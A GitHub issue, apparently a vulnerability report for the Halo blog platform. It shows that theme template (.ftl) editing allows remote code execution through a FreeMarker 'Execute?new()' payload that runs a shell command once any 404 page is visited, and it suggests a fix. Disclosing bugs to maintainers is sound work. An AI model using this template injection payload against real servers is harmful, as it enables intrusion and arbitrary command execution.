**I want to apply**

* BUG feedback

In the Edit Theme File function. I can edit the ftl file. This is the freemarker template file. This file can cause arbitrary code execution when it is rendered in the background.

[![image](https://user-images.githubusercontent.com/16250867/70614647-dd56dd00-1c45-11ea-8b1c-675908c19059.png)](https://user-images.githubusercontent.com/16250867/70614647-dd56dd00-1c45-11ea-8b1c-675908c19059.png)

RCE code is

```
<#assign test="freemarker.template.utility.Execute"?new()>
${test("touch /tmp/freemarkerPwned")}

```

Then visit an arbitrary 404 page, this vulnerability is triggered.

such as http: //demo.halo/foo

[![image](https://github.com/c0d1007/exploit/blob/master/1.jpg)](https://github.com/c0d1007/exploit/blob/master/1.jpg)

## Execute system command

[![image](https://github.com/c0d1007/exploit/blob/master/3.jpg)](https://github.com/c0d1007/exploit/blob/master/3.jpg)

# Remark

Because the preview does not display the picture properly when editing the issus, you can visit my github project(<https://github.com/c0d1007/exploit>) and view the picture.

# Solution

Template files can only be edited locally, or check the file input
